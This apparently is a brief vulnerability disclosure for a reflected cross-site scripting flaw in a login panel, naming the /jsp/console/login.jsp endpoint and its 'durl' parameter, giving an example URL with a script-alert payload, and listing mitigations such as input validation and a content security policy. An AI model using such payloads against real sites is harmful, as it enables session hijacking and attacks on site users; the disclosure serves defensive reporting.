### Login panel:
In login panel endpoint is /jsp/console/login.jsp

Add a parameter in endpoint "durl=" and Inject with a XSS payload.

#### Example:
https://example.com/jsp/console/login.jsp?durl="><script>alert(1)</script>

### Mitigation:
* All user entry points in the application should be properly validated or sanitized, the validation mechanism must be implemented on both client and server side of the application.
* Using of regular expressions for user entry points is also a best practice.
* Do not process user entered data in DOM functions directly.
* Implement content security policy in the application.
